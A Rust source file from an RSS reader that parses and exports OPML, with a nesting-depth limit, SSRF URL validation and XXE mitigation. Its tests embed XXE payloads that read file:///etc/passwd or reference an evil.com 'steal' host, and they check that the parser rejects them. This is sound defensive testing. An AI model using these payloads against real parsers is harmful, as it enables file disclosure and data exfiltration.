use anyhow::{Context, Result};
use quick_xml::events::Event;
use quick_xml::Reader;
use thiserror::Error;

use crate::util::validate_url;

/// SEC-003: Maximum allowed nesting depth for OPML outline elements.
/// Prevents stack overflow attacks from maliciously crafted deeply nested OPMLs.
const MAX_OPML_DEPTH: usize = 50;

/// Errors that can occur during OPML parsing.
#[derive(Debug, Error)]
pub enum OpmlError {
    /// SEC-003: OPML nesting depth exceeds safety limit.
    #[error("OPML nesting depth exceeds maximum of {0} levels")]
    MaxDepthExceeded(usize),

    /// XML parsing failed.
    #[error("XML parse error: {0}")]
    XmlParse(String),

    /// File I/O error.
    #[error("Failed to read OPML file: {0}")]
    Io(#[from] std::io::Error),
}

/// A feed subscription extracted from an OPML file.
///
/// Represents a single `<outline>` element with an `xmlUrl` attribute,
/// typically used for RSS/Atom feed subscriptions.
#[derive(Debug, Clone)]
pub struct OpmlFeed {
    /// Display title for the feed. Sourced from `title` attribute,
    /// falling back to `text` attribute, then to the XML URL itself.
    pub title: String,
    /// URL of the RSS/Atom feed XML. Validated to be HTTP(S) and not
    /// pointing to localhost or private IP ranges.
    pub xml_url: String,
    /// URL of the feed's website, if provided via `htmlUrl` attribute.
    pub html_url: Option<String>,
}

/// Parses an OPML file from disk and extracts feed subscriptions.
///
/// Reads the file at the given path and parses it as OPML format,
/// extracting all outline elements that have an `xmlUrl` attribute.
///
/// # Arguments
///
/// * `path` - Filesystem path to the OPML file
///
/// # Returns
///
/// A `Vec` of [`OpmlFeed`] structs representing the feed subscriptions.
/// Feeds with invalid URLs (localhost, private IPs, non-HTTP schemes)
/// are silently skipped with a warning log.
///
/// # Errors
///
/// Returns an error if:
/// - The file cannot be read
/// - The content is not valid XML
/// - XML parsing fails
///
/// # Security
///
/// - XXE (XML External Entity) attacks are mitigated because `quick-xml` (0.37) does not
///   parse `<!ENTITY>` declarations. Custom entities cause `EscapeError::UnrecognizedEntity`.
///   See SEC-002 comment in `parse_opml_content()` for details.
/// - URLs are validated to prevent SSRF attacks against localhost and private networks
pub async fn parse(path: &str) -> Result<Vec<OpmlFeed>> {
    let content = tokio::fs::read_to_string(path)
        .await
        .with_context(|| format!("Failed to read OPML file: {}", path))?;
    parse_opml_content(&content)
}

/// Parses OPML content string and extracts feed subscriptions.
///
/// Internal implementation shared by `parse()`. Handles both nested and
/// flat OPML structures, extracting feeds from any `<outline>` element
/// with an `xmlUrl` attribute regardless of nesting depth.
///
/// Category/folder outlines (those without `xmlUrl`) are traversed but
/// not returned in the result.
fn parse_opml_content(content: &str) -> Result<Vec<OpmlFeed>> {
    // SEC-002: XXE protection — quick-xml (0.37) never parses <!ENTITY> declarations from
    // DOCTYPE. Entity resolution is handled solely by `resolve_predefined_entity()` in the
    // escape layer, which only resolves the 5 XML builtins (&lt; &gt; &amp; &apos; &quot;).
    // Custom entities like &xxe; produce an `EscapeError::UnrecognizedEntity` error via
    // `decode_and_unescape_value()`. There is no Config toggle for this — it is structural.
    // If a future quick-xml version adds entity expansion, our use of
    // `decode_and_unescape_value()` (not `_with()`) ensures we stay on the safe default.
    let mut reader = Reader::from_str(content);
    reader.config_mut().trim_text(true);

    let mut feeds = Vec::new();
    let mut buf = Vec::new();
    // SEC-003: Track nesting depth to prevent stack overflow from malicious OPMLs
    let mut depth: usize = 0;

    loop {
        match reader.read_event_into(&mut buf) {
            Ok(Event::Start(e)) if e.name().as_ref() == b"outline" => {
                depth += 1;
                // SEC-003: Reject excessively nested OPMLs
                if depth > MAX_OPML_DEPTH {
                    return Err(OpmlError::MaxDepthExceeded(MAX_OPML_DEPTH).into());
                }

                if let Some(feed) = parse_outline_attributes(&e, &reader)? {
                    feeds.push(feed);
                }
            }
            Ok(Event::Empty(e)) if e.name().as_ref() == b"outline" => {
                // Self-closing outline doesn't affect depth
                if let Some(feed) = parse_outline_attributes(&e, &reader)? {
                    feeds.push(feed);
                }
            }
            Ok(Event::End(e)) if e.name().as_ref() == b"outline" => {
                depth = depth.saturating_sub(1);
            }
            Ok(Event::Eof) => break,
            Err(e) => return Err(OpmlError::XmlParse(e.to_string()).into()),
            _ => {}
        }
        buf.clear();
    }

    Ok(feeds)
}

/// Extracts feed attributes from an outline element.
///
/// Returns `Some(OpmlFeed)` if the outline has a valid `xmlUrl` attribute,
/// `None` for category/folder outlines without feed URLs.
fn parse_outline_attributes(
    e: &quick_xml::events::BytesStart<'_>,
    reader: &Reader<&[u8]>,
) -> Result<Option<OpmlFeed>> {
    let mut xml_url = None;
    let mut html_url = None;
    let mut title = None;

    for attr_result in e.attributes() {
        let attr = match attr_result {
            Ok(attr) => attr,
            Err(e) => {
                tracing::warn!(error = %e, "Skipping malformed OPML attribute");
                continue;
            }
        };
        let decoder = reader.decoder();
        match attr.key.as_ref() {
            b"xmlUrl" => xml_url = Some(attr.decode_and_unescape_value(decoder)?.to_string()),
            b"htmlUrl" => {
                let url_str = attr.decode_and_unescape_value(decoder)?;
                // SEC: Validate HTML URL before accepting (same as xmlUrl)
                match validate_url(&url_str) {
                    Ok(_) => html_url = Some(url_str.to_string()),
                    Err(e) => {
                        tracing::warn!(url = %url_str, error = %e, "Ignoring invalid htmlUrl in OPML");
                    }
                }
            }
            b"title" => title = Some(attr.decode_and_unescape_value(decoder)?.to_string()),
            b"text" => {
                if title.is_none() {
                    title = Some(attr.decode_and_unescape_value(decoder)?.to_string())
                }
            }
            _ => {}
        }
    }

    if let Some(url) = xml_url {
        // SEC-002: Validate URL before accepting
        match validate_url(&url) {
            Ok(_) => Ok(Some(OpmlFeed {
                title: title.unwrap_or_else(|| url.clone()),
                xml_url: url,
                html_url,
            })),
            Err(e) => {
                tracing::warn!(url = %url, error = %e, "Skipping invalid feed URL");
                Ok(None)
            }
        }
    } else {
        Ok(None)
    }
}

/// Exports feed subscriptions as an OPML 2.0 XML string.
///
/// Generates a valid OPML 2.0 document containing `<outline>` elements
/// for each feed, with `type="rss"`, `text`, `title`, `xmlUrl`, and
/// optionally `htmlUrl` attributes.
///
/// # Arguments
///
/// * `feeds` - Slice of [`OpmlFeed`] structs to export
///
/// # Returns
///
/// A `String` containing the complete OPML 2.0 XML document.
pub fn export_opml(feeds: &[OpmlFeed]) -> Result<String> {
    use quick_xml::events::{BytesDecl, BytesEnd, BytesStart, Event};
    use quick_xml::Writer;
    use std::io::Cursor;

    let mut writer = Writer::new_with_indent(Cursor::new(Vec::new()), b' ', 2);

    // XML declaration
    writer
        .write_event(Event::Decl(BytesDecl::new("1.0", Some("UTF-8"), None)))
        .context("Failed to write XML declaration")?;

    // <opml version="2.0">
    let mut opml = BytesStart::new("opml");
    opml.push_attribute(("version", "2.0"));
    writer
        .write_event(Event::Start(opml))
        .context("Failed to write opml element")?;

    // <head><title>skim RSS Subscriptions</title></head>
    writer
        .write_event(Event::Start(BytesStart::new("head")))
        .context("Failed to write head element")?;
    writer
        .write_event(Event::Start(BytesStart::new("title")))
        .context("Failed to write title element")?;
    writer
        .write_event(Event::Text(quick_xml::events::BytesText::new(
            "skim RSS Subscriptions",
        )))
        .context("Failed to write title text")?;
    writer
        .write_event(Event::End(BytesEnd::new("title")))
        .context("Failed to write title end")?;
    writer
        .write_event(Event::End(BytesEnd::new("head")))
        .context("Failed to write head end")?;

    // <body>
    writer
        .write_event(Event::Start(BytesStart::new("body")))
        .context("Failed to write body element")?;

    for feed in feeds {
        let mut outline = BytesStart::new("outline");
        outline.push_attribute(("type", "rss"));
        outline.push_attribute(("text", feed.title.as_str()));
        outline.push_attribute(("title", feed.title.as_str()));
        outline.push_attribute(("xmlUrl", feed.xml_url.as_str()));
        if let Some(ref html_url) = feed.html_url {
            outline.push_attribute(("htmlUrl", html_url.as_str()));
        }
        writer
            .write_event(Event::Empty(outline))
            .context("Failed to write outline element")?;
    }

    // </body>
    writer
        .write_event(Event::End(BytesEnd::new("body")))
        .context("Failed to write body end")?;

    // </opml>
    writer
        .write_event(Event::End(BytesEnd::new("opml")))
        .context("Failed to write opml end")?;

    let result = writer.into_inner().into_inner();
    String::from_utf8(result).context("Generated OPML contains invalid UTF-8")
}

/// Exports feed subscriptions to an OPML file atomically.
///
/// Writes the OPML content to a temporary file in the same directory,
/// syncs to disk, then atomically renames to the final path. This ensures
/// the destination file is never left in a partial state.
///
/// # Arguments
///
/// * `feeds` - Slice of [`OpmlFeed`] structs to export
/// * `path` - Destination filesystem path for the OPML file
pub fn export_to_file(feeds: &[OpmlFeed], path: &std::path::Path) -> Result<()> {
    use std::time::{SystemTime, UNIX_EPOCH};

    let content = export_opml(feeds)?;

    // SEC-009: Randomized temp filename to prevent TOCTOU race conditions
    let random_suffix = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let temp_path = path.with_extension(format!("tmp.{:016x}", random_suffix));

    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&temp_path)
        .with_context(|| {
            format!(
                "Failed to create temporary file '{}': check directory permissions",
                temp_path.display()
            )
        })?;

    std::io::Write::write_all(&mut file, content.as_bytes()).with_context(|| {
        let _ = std::fs::remove_file(&temp_path);
        format!(
            "Failed to write OPML to temporary file '{}'",
            temp_path.display()
        )
    })?;

    file.sync_all().with_context(|| {
        let _ = std::fs::remove_file(&temp_path);
        format!(
            "Failed to sync temporary file '{}' to disk",
            temp_path.display()
        )
    })?;

    drop(file);

    std::fs::rename(&temp_path, path).with_context(|| {
        let _ = std::fs::remove_file(&temp_path);
        format!(
            "Failed to rename '{}' to '{}'",
            temp_path.display(),
            path.display()
        )
    })?;

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_opml_content() {
        let content = r#"<?xml version="1.0" encoding="UTF-8"?>
<opml version="2.0">
  <head><title>Test Feeds</title></head>
  <body>
    <outline text="Blogs" title="Blogs">
      <outline type="rss" text="Example Blog" title="Example Blog" xmlUrl="https://example.com/feed.xml" htmlUrl="https://example.com"/>
      <outline type="rss" text="No HTML" title="No HTML" xmlUrl="https://nohtml.com/rss"/>
    </outline>
  </body>
</opml>"#;

        let feeds =
            parse_opml_content(content).expect("Failed to parse OPML content with nested outlines");
        assert_eq!(feeds.len(), 2);

        assert_eq!(feeds[0].title, "Example Blog");
        assert_eq!(feeds[0].xml_url, "https://example.com/feed.xml");
        assert_eq!(feeds[0].html_url, Some("https://example.com".to_string()));

        assert_eq!(feeds[1].title, "No HTML");
        assert_eq!(feeds[1].xml_url, "https://nohtml.com/rss");
        assert_eq!(feeds[1].html_url, None);
    }

    #[test]
    fn test_fallback_to_text() {
        let content = r#"<?xml version="1.0"?>
<opml version="2.0">
  <body>
    <outline type="rss" text="Text Only" xmlUrl="https://textonly.com/feed"/>
  </body>
</opml>"#;

        let feeds =
            parse_opml_content(content).expect("Failed to parse OPML with text-only attribute");
        assert_eq!(feeds.len(), 1);
        assert_eq!(feeds[0].title, "Text Only");
    }

    #[test]
    fn test_fallback_to_url() {
        let content = r#"<?xml version="1.0"?>
<opml version="2.0">
  <body>
    <outline type="rss" xmlUrl="https://notitle.com/feed"/>
  </body>
</opml>"#;

        let feeds =
            parse_opml_content(content).expect("Failed to parse OPML with URL-only outline");
        assert_eq!(feeds.len(), 1);
        assert_eq!(feeds[0].title, "https://notitle.com/feed");
    }

    #[test]
    fn test_skip_private_ip_feeds() {
        let content = r#"<?xml version="1.0"?>
    <opml version="2.0"><body>
        <outline xmlUrl="https://valid.com/feed"/>
        <outline xmlUrl="http://192.168.1.1/feed"/>
        <outline xmlUrl="http://10.0.0.1/feed"/>
    </body></opml>"#;

        let feeds = parse_opml_content(content).unwrap();
        assert_eq!(feeds.len(), 1); // Only valid.com included
        assert_eq!(feeds[0].xml_url, "https://valid.com/feed");
    }

    #[test]
    fn test_skip_localhost_feeds() {
        let content = r#"<?xml version="1.0"?>
    <opml version="2.0"><body>
        <outline xmlUrl="https://valid.com/feed"/>
        <outline xmlUrl="http://localhost/feed"/>
        <outline xmlUrl="http://127.0.0.1/feed"/>
    </body></opml>"#;

        let feeds = parse_opml_content(content).unwrap();
        assert_eq!(feeds.len(), 1);
        assert_eq!(feeds[0].xml_url, "https://valid.com/feed");
    }

    #[test]
    fn test_skip_invalid_scheme_feeds() {
        let content = r#"<?xml version="1.0"?>
    <opml version="2.0"><body>
        <outline xmlUrl="https://valid.com/feed"/>
        <outline xmlUrl="file:///etc/passwd"/>
        <outline xmlUrl="ftp://internal.server/feed"/>
    </body></opml>"#;

        let feeds = parse_opml_content(content).unwrap();
        assert_eq!(feeds.len(), 1);
        assert_eq!(feeds[0].xml_url, "https://valid.com/feed");
    }

    #[test]
    fn test_empty_opml() {
        let content = r#"<?xml version="1.0"?>
    <opml version="2.0"><body></body></opml>"#;

        let feeds = parse_opml_content(content).unwrap();
        assert!(feeds.is_empty());
    }

    #[test]
    fn test_malformed_xml_error() {
        let content = "<not valid xml";
        let result = parse_opml_content(content);
        assert!(result.is_err());
    }

    #[test]
    fn test_xxe_protection() {
        // SEC-002: This XXE payload should NOT expand to file contents.
        // quick-xml (0.37) does not parse <!ENTITY> declarations at all.
        // The &xxe; reference will hit `resolve_predefined_entity()` which only
        // knows the 5 XML builtins, causing an EscapeError::UnrecognizedEntity.
        let malicious_opml = r#"<?xml version="1.0"?>
<!DOCTYPE opml [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<opml version="2.0">
    <body>
        <outline text="&xxe;" xmlUrl="https://example.com/feed.xml"/>
    </body>
</opml>"#;

        let result = parse_opml_content(malicious_opml);
        // Should either error OR have literal text (not file contents)
        match result {
            Ok(feeds) => {
                // If it parses, the text should NOT contain actual /etc/passwd content
                for feed in &feeds {
                    assert!(
                        !feed.title.contains("root:"),
                        "XXE expansion detected! Feed title contains passwd content"
                    );
                    assert!(
                        !feed.title.contains("/bin/"),
                        "XXE expansion detected! Feed title contains passwd content"
                    );
                }
            }
            Err(_) => {
                // Rejection of XXE payload is also acceptable behavior
            }
        }
    }

    #[test]
    fn test_xxe_internal_entity_not_expanded() {
        // SEC-002: Internal (non-SYSTEM) entity declarations should also not expand.
        // This tests the case where the entity is defined inline in the DOCTYPE,
        // not referencing an external file.
        let opml_with_internal_entity = r#"<?xml version="1.0"?>
<!DOCTYPE opml [<!ENTITY internal "EXPANDED_VALUE">]>
<opml version="2.0">
    <body>
        <outline text="&internal;" xmlUrl="https://example.com/feed.xml"/>
    </body>
</opml>"#;

        let result = parse_opml_content(opml_with_internal_entity);
        match result {
            Ok(feeds) => {
                for feed in &feeds {
                    assert!(
                        !feed.title.contains("EXPANDED_VALUE"),
                        "Internal entity was expanded! Title: {}",
                        feed.title
                    );
                }
            }
            Err(_) => {
                // Rejection (UnrecognizedEntity error) is the expected behavior
            }
        }
    }

    #[test]
    fn test_xxe_parameter_entity_not_expanded() {
        // SEC-002: Parameter entities (%entity;) used in DTD attacks should not expand.
        let opml_with_param_entity = r#"<?xml version="1.0"?>
<!DOCTYPE opml [
  <!ENTITY % payload SYSTEM "file:///etc/passwd">
  <!ENTITY % wrapper "<!ENTITY exploit '%payload;'>">
  %wrapper;
]>
<opml version="2.0">
    <body>
        <outline text="test" xmlUrl="https://example.com/feed.xml"/>
    </body>
</opml>"#;

        let result = parse_opml_content(opml_with_param_entity);
        match result {
            Ok(feeds) => {
                // If parsing succeeds, no entity content should leak into feed data
                for feed in &feeds {
                    assert!(
                        !feed.title.contains("root:"),
                        "Parameter entity XXE detected! Title: {}",
                        feed.title
                    );
                }
            }
            Err(_) => {
                // Rejection is acceptable — quick-xml may error on malformed DOCTYPE
            }
        }
    }

    #[test]
    fn test_xxe_entity_in_url_attribute() {
        // SEC-002: Entity references in xmlUrl attributes should also be rejected.
        let opml_entity_in_url = r#"<?xml version="1.0"?>
<!DOCTYPE opml [<!ENTITY exfil SYSTEM "https://evil.com/steal">]>
<opml version="2.0">
    <body>
        <outline text="Legit Feed" xmlUrl="&exfil;"/>
    </body>
</opml>"#;

        let result = parse_opml_content(opml_entity_in_url);
        match result {
            Ok(feeds) => {
                for feed in &feeds {
                    assert!(
                        !feed.xml_url.contains("evil.com"),
                        "Entity expanded in URL! URL: {}",
                        feed.xml_url
                    );
                }
            }
            Err(_) => {
                // Rejection is the expected behavior
            }
        }
    }

    #[test]
    fn test_deeply_nested_opml_rejected() {
        // SEC-003: Create OPML with 100+ nested outlines (exceeds MAX_OPML_DEPTH of 50)
        let mut opml = String::from(r#"<?xml version="1.0"?><opml version="2.0"><body>"#);
        for _ in 0..100 {
            opml.push_str(r#"<outline text="level">"#);
        }
        for _ in 0..100 {
            opml.push_str("</outline>");
        }
        opml.push_str("</body></opml>");

        let result = parse_opml_content(&opml);
        assert!(result.is_err(), "Deeply nested OPML should be rejected");

        let err = result.unwrap_err();
        let err_msg = err.to_string();
        assert!(
            err_msg.contains("depth") && err_msg.contains("50"),
            "Error should mention depth limit: {}",
            err_msg
        );
    }

    #[test]
    fn test_nesting_at_depth_limit_allowed() {
        // Create OPML with exactly MAX_OPML_DEPTH (50) nested outlines - should be allowed
        let mut opml = String::from(r#"<?xml version="1.0"?><opml version="2.0"><body>"#);
        for _ in 0..50 {
            opml.push_str(r#"<outline text="level">"#);
        }
        // Add a feed at the deepest level
        opml.push_str(r#"<outline text="Deep Feed" xmlUrl="https://deep.example.com/feed"/>"#);
        for _ in 0..50 {
            opml.push_str("</outline>");
        }
        opml.push_str("</body></opml>");

        let result = parse_opml_content(&opml);
        assert!(
            result.is_ok(),
            "OPML at exactly max depth should be allowed: {:?}",
            result.err()
        );
        let feeds = result.unwrap();
        assert_eq!(feeds.len(), 1);
        assert_eq!(feeds[0].title, "Deep Feed");
    }

    #[test]
    fn test_export_opml_round_trip() {
        let original = vec![
            OpmlFeed {
                title: "Example Blog".to_string(),
                xml_url: "https://example.com/feed.xml".to_string(),
                html_url: Some("https://example.com".to_string()),
            },
            OpmlFeed {
                title: "No HTML Feed".to_string(),
                xml_url: "https://nohtml.com/rss".to_string(),
                html_url: None,
            },
        ];

        let exported = export_opml(&original).expect("Failed to export OPML");
        let parsed = parse_opml_content(&exported).expect("Failed to parse exported OPML");

        assert_eq!(parsed.len(), original.len());
        for (orig, round) in original.iter().zip(parsed.iter()) {
            assert_eq!(orig.title, round.title);
            assert_eq!(orig.xml_url, round.xml_url);
            assert_eq!(orig.html_url, round.html_url);
        }
    }

    #[test]
    fn test_export_opml_empty_feeds() {
        let exported = export_opml(&[]).expect("Failed to export empty OPML");
        assert!(exported.contains("<?xml"));
        assert!(exported.contains("<opml"));
        assert!(exported.contains("<body"));
        assert!(exported.contains("</body>"));

        let parsed = parse_opml_content(&exported).expect("Failed to parse empty OPML");
        assert!(parsed.is_empty());
    }

    #[test]
    fn test_export_opml_xml_escaping() {
        let feeds = vec![OpmlFeed {
            title: "Feed with <special> & \"chars\"".to_string(),
            xml_url: "https://example.com/feed?a=1&b=2".to_string(),
            html_url: None,
        }];

        let exported = export_opml(&feeds).expect("Failed to export OPML with special chars");
        let parsed =
            parse_opml_content(&exported).expect("Failed to parse OPML with special chars");

        assert_eq!(parsed.len(), 1);
        assert_eq!(parsed[0].title, "Feed with <special> & \"chars\"");
        assert_eq!(parsed[0].xml_url, "https://example.com/feed?a=1&b=2");
    }

    #[test]
    fn test_export_to_file() {
        let feeds = vec![OpmlFeed {
            title: "File Export Test".to_string(),
            xml_url: "https://example.com/feed.xml".to_string(),
            html_url: Some("https://example.com".to_string()),
        }];

        let dir = std::env::temp_dir();
        let path = dir.join("test_export.opml");

        export_to_file(&feeds, &path).expect("Failed to export to file");

        let content = std::fs::read_to_string(&path).expect("Failed to read exported file");
        let parsed = parse_opml_content(&content).expect("Failed to parse file content");

        assert_eq!(parsed.len(), 1);
        assert_eq!(parsed[0].title, "File Export Test");

        // Cleanup
        let _ = std::fs::remove_file(&path);
    }
}
